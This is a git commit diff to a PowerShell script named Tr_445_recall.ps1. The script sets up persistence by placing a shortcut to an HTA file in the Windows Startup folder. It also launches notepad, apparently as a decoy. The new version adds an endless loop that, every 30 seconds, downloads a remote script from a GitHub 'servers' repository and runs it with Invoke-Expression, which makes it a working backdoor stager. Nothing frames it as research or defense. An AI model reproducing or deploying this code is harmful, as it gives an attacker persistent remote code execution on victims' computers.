f66b616ed03bd1bfa85f621e9eaa44180524f551
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2024-01-28 12:25:17 +0600

    Update Tr_445_recall.ps1

--- Tr_445_recall.ps1
+++ Tr_445_recall.ps1
@@ -1,15 +1,11 @@
-notepad;
+notepad
+# Create shortcut to HTA file in Startup folder
 $Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code1.lnk")
 $Shortcut.TargetPath = "$env:USERPROFILE\code1.hta"
-$Shortcut.Save();
+$Shortcut.Save()
 
-$processes = Get-Process
-
-$i = 1
-ForEach ($process in $processes) {
-
+# Loop to run PowerShell script every 30 seconds
+while ($true) {
     Start-Sleep -Seconds 30
-    IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_446_server.ps1')
-    $i++
-   
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/HAXORK8880/servers/main/Tr_446_server.ps1')
 }
